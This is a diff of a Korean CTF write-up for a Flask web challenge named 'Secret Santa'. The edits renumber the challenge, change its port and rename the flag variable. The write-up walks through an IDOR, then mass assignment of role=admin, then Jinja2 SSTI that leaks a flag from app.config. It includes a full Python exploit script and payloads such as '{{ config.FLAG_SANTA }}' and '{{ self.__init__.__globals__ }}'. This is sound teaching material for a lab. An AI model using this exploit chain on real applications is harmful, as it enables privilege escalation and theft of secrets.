@@ -1,4 +1,4 @@
-# hard-07 — 시크릿 산타 풀이
+# hard-06 — 시크릿 산타 풀이
 
 ## 1. 문제 개요
 
@@ -6,12 +6,12 @@
 |---|---|
 | 분류 | Web / IDOR(정찰) → Mass Assignment(권한 상승) → SSTI(플래그 유출) |
 | 난이도 | Hard |
-| 접속 | `http://<출제조IP>:8011` |
+| 접속 | `http://<출제조IP>:8013` |
 | 시작 | 회원가입으로 계정 생성 (초기 role = `applicant`) |
-| 플래그 형식 | `GlassHouse{...}` (환경변수 `FLAG_H07_SANTA`) |
+| 플래그 형식 | `GlassHouse{...}` (환경변수 `FLAG_SANTA`) |
 
 **최종 목표:** 운영진(엘프)만 들어가는 "엘프 사무실"의 카드 미리보기 기능을 악용해, 메모리(`app.config`)에만 올라가 있는 플래그를 유출한다.
-플래그는 파일로 떨어지지 않고 `app.py`가 `.env`에서 읽어 `app.config["FLAG_H07_SANTA"]`에만 보관한다. 따라서 **파일을 읽는 게 아니라, 앱 안에서 도는 코드로 `config` 값을 뽑아내야** 한다.
+플래그는 파일로 떨어지지 않고 `app.py`가 `.env`에서 읽어 `app.config["FLAG_SANTA"]`에만 보관한다. 따라서 **파일을 읽는 게 아니라, 앱 안에서 도는 코드로 `config` 값을 뽑아내야** 한다.
 
 ![app.config 에만 올라가는 플래그](images/10-config-flag.png)
 
@@ -24,7 +24,7 @@
 1. 플래그가 엘프 사무실(`/elf`, `/elf/card/preview`)에서만 닿을 수 있고, 이 기능은 `role == "admin"`만 허용함을 확인한다. 회원가입 계정은 `applicant` 고정이라 정면으로는 못 들어간다.
 2. 위시리스트 상세(`/wishlist/<id>`)에 **소유자 검사가 없음**(IDOR)을 발견한다. 운영진 소유의 13번을 열어 다음 공략 지점(프로필의 role)을 알려주는 힌트를 얻는다.
 3. 프로필 저장이 화이트리스트(`PROFILE_FIELDS`)를 선언만 하고 쓰지 않아, **폼 전체를 `.update()`로 덮어씀**(Mass Assignment)을 확인한다. `role=admin`을 끼워 넣어 스스로 운영진으로 승격한다.
-4. 승격 후 엘프 사무실의 카드 미리보기가 사용자 입력을 **템플릿 소스로 이어붙여 `render_template_string()`에 넣는**(SSTI) 것을 확인한다. `{{ config.FLAG_H07_SANTA }}`로 메모리의 플래그를 렌더시킨다.
+4. 승격 후 엘프 사무실의 카드 미리보기가 사용자 입력을 **템플릿 소스로 이어붙여 `render_template_string()`에 넣는**(SSTI) 것을 확인한다. `{{ config.FLAG_SANTA }}`로 메모리의 플래그를 렌더시킨다.
 
 각 단계의 "왜/무엇을 확인했는지"는 3~4절에서 코드와 함께 설명한다.
 
@@ -145,12 +145,12 @@ def card_preview():
 
 `render_template_string()`은 **인자 문자열 자체를 Jinja2 템플릿으로 컴파일**한다. 사용자 입력(`to`, `message`)이 데이터가 아니라 **템플릿 소스의 일부**로 들어가므로, `{{ ... }}`를 넣으면 서버에서 평가된다 → **SSTI**. Jinja2 템플릿 안에서는 `config`(= `app.config`)에 바로 접근할 수 있다.
 
-- **성립 조건:** admin 세션으로 `/elf/card/preview`에 `message={{ config.FLAG_H07_SANTA }}` 전송.
+- **성립 조건:** admin 세션으로 `/elf/card/preview`에 `message={{ config.FLAG_SANTA }}` 전송.
 - **영향:** 메모리에만 있던 플래그가 카드 미리보기에 렌더되어 노출.
 
 ![card_preview — 입력을 이어붙여 render_template_string](images/09-ssti-code.png)
 
-> 참고: `config`가 막혀 있어도 `{{ self.__init__.__globals__ }}` 류의 표준 SSTI 기법으로 같은 값에 도달할 수 있다. 여기서는 플래그가 `config`에 바로 올라와 `{{ config.FLAG_H07_SANTA }}` 한 줄이면 된다.
+> 참고: `config`가 막혀 있어도 `{{ self.__init__.__globals__ }}` 류의 표준 SSTI 기법으로 같은 값에 도달할 수 있다. 여기서는 플래그가 `config`에 바로 올라와 `{{ config.FLAG_SANTA }}` 한 줄이면 된다.
 
 ---
 
@@ -177,7 +177,7 @@ def card_preview():
 ![카드 미리보기에 렌더된 플래그](images/11-flag.png)
 
 **플래그:** `GlassHouse{...}`
-> 실제 값은 배포본 `.env`의 `FLAG_H07_SANTA`를 따른다.
+> 실제 값은 배포본 `.env`의 `FLAG_SANTA`를 따른다.
 
 ---
 
@@ -218,16 +218,16 @@ preview = render_template("santa/card.html", to=to, message=message)
 
 ```python
 #!/usr/bin/env python3
-# hard-07 (시크릿 산타) - IDOR 정찰 -> Mass Assignment 승격 -> SSTI 플래그 유출
-# 사용: python3 exploit.py http://<IP>:8011
+# hard-06 (시크릿 산타) - IDOR 정찰 -> Mass Assignment 승격 -> SSTI 플래그 유출
+# 사용: python3 exploit.py http://<IP>:8013
 import re
 import sys
 import requests
 
-BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8011"
+BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8013"
 USER, PW = "hohoho01", "pw12345"      # 아이디에 admin/reviewer/staff 등 금지어만 피하면 됨
 
-s = requests.Session()  # 세션 쿠키(gh_8011) 자동 관리
+s = requests.Session()  # 세션 쿠키(gh_8013) 자동 관리
 
 # 0) 회원가입 (role 은 서버가 applicant 로 고정)
 s.post(f"{BASE}/signup", data={"username": USER, "password": PW, "password_confirm": PW,
@@ -249,14 +249,14 @@ print(f"[*] mass-assign role=admin -> {r.status_code}  (session.role=admin 승�
 
 # 4) SSTI - 엘프 사무실 카드 미리보기로 config 플래그 렌더
 r = s.post(f"{BASE}/elf/card/preview",
-           data={"to": "홍길동", "message": "{{ config.FLAG_H07_SANTA }}"})
+           data={"to": "홍길동", "message": "{{ config.FLAG_SANTA }}"})
 m = re.search(r"GlassHouse\{[^}]*\}", r.text)
 print(f"[+] FLAG: {m.group(0)}" if m else "[-] 플래그를 찾지 못함 (승격 실패 가능)")
 ```
 
 **실행 예시**
 ```bash
-$ python3 exploit.py http://127.0.0.1:8011
+$ python3 exploit.py http://127.0.0.1:8013
 [*] logged in as applicant
 [*] IDOR /wishlist/13 -> 200  (운영진 memo 힌트: role을 admin으로)
 [*] mass-assign role=admin -> 302  (session.role=admin 승격)
@@ -272,5 +272,5 @@ $ python3 exploit.py http://127.0.0.1:8011
   → 프로필 수정 Mass Assignment (B: PROFILE_FIELDS 미사용, form 전체 .update)
      → role=admin 주입 → session.role=admin = 엘프(운영진) 승격
   → 엘프 사무실 카드 미리보기 SSTI (C: 입력을 render_template_string 소스에 연결)
-     → {{ config.FLAG_H07_SANTA }} 로 메모리의 플래그 유출
+     → {{ config.FLAG_SANTA }} 로 메모리의 플래그 유출
 ```
